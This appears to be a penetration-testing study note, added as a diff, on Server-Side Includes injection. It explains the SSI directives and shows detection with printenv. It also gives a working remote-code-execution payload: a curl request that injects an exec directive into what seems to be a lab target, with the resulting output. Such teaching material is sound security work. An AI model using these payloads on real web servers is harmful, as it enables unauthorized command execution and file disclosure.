@@ -1,0 +1,151 @@
+---
+Primary_category: "[[WEB ATTACKS]]"
+title: "SSI INJECTION"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[WEB ATTACKS]]
+
+#### *Theory*
+
+***Server-Side Includes Injection ( SSI Injection )*** occurs when a user-controlled input is inserted into content that is later processed by the web server as *SSI directive*
+
+If *SSI Processing* is enabled and the input is not properly sanitized, an attacker may inject directives such as **`<!--# ... -->`**, potentially leading to information disclosure, arbitrary file inclusion/read or command execution, depending on the server configuration
+
+For instance, this security flaw may occurs if a web application contains a vulnerable ***[[FILE UPLOAD|File Upload]]*** feature that enables an attacker to upload a file containing malicious *SSI* directives
+
+In addition, attacker might be able to inject malicious *SSI* directives if a web application write user input to a file in the web root directory
+
+The use of *SSI* can often be inferred from the file extension. Typical file extensions include **`.shtml`**, **`shtm`** and **`.stm`**
+
+> [!IMPORTANT]- *Important*
+>
+> ***However, web servers can be configured to support SSI directives in arbitrary file extensions***
+>
+
+##### *SSI Directives*
+
+Therefore, *SSI* utilizes directives to add dinamically generated content to static *HTML* page
+
+As stated, a directive has the following structure →
+
+```bash
+<!--#name param1="value1" param2="value" -->
+```
+
+> ***Some of the most interesting directives are explained below*** ⬇️
+
+###### *printenv*
+
+It prints environment variables
+
+```bash
+<!--#printenv -->
+```
+
+###### *config*
+
+This directive changes the *SSI* configuration by specifying corresponding parameters
+
+> ***e.g. Change the error message***
+
+```bash
+<!--#config errmsg="Error!" -->
+```
+
+###### *echo*
+
+It prints the value of any variable given in the **`var`** parameter
+
+- ***Variables***
+
+```bash
+DOCUMENT_NAME
+DOCUMENT_URI
+LAST_MODIFIED
+DATE_LOCAL
+```
+
+> ***e.g.***
+
+```bash
+<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
+```
+
+###### *exec*
+
+It executes the command given in the **`cmd`** parameter
+
+```bash
+<!--#exec cmd="<COMMAND>" -->
+```
+
+###### *include*
+
+This directive includes the file specified in the **`virtual`** parameter
+
+> ***It only allows for the inclusion of files in the web root directory***
+
+```bash
+<!--#include virtual="<FILE>" -->
+```
+
+> [!DANGER]- *e.g.*
+>
+> ```bash
+> <!--#include virtual="index.html" -->
+> ```
+>
+
+---
+
+#### *Identifying an SSI Injection*
+
+We can simply enter one of the *SSI* directives above into the given web application's input and see how it's processed
+
+For instance, we can use the ***[[#printenv]]*** directive to print all existing environment variables
+
+```bash
+<!--#printenv -->
+```
+
+![[SSI INJECTION-20260918190341958.webp|450]]
+
+> ***Zoom in***
+
+---
+
+#### *Exploiting an SSI Injection*
+
+##### *Remote Code Execution*
+
+As with ***[[#Identifying an SSI Injection]]***, we can use a specific *SSI* directive to perfom certain actions once we have verified that the web application in question is vulnerable to *SSI*
+
+In this case, we can leverage the ***[[#exec]]*** directive to execute system commands, such as follows:
+
+```bash
+<!--#exec cmd="<COMMAND>" -->
+```
+
+> ***e.g.***
+
+```bash
+curl --silent --location --request GET --get --data-urlencode 'msg=<!--#exec cmd="id" -->' 'http://154.57.164.82:32068/index.php'
+```
+
+> [!TLDR]- *Expected Output*
+>
+> ```bash
+> <SNIP>
+> Hi uid=33(www-data) gid=33(www-data) groups=33(www-data)
+> <SNIP>
+> ```
+>
+
+![[Pasted image 20260918191102.png|450]]
+
+> ***Zoom in***
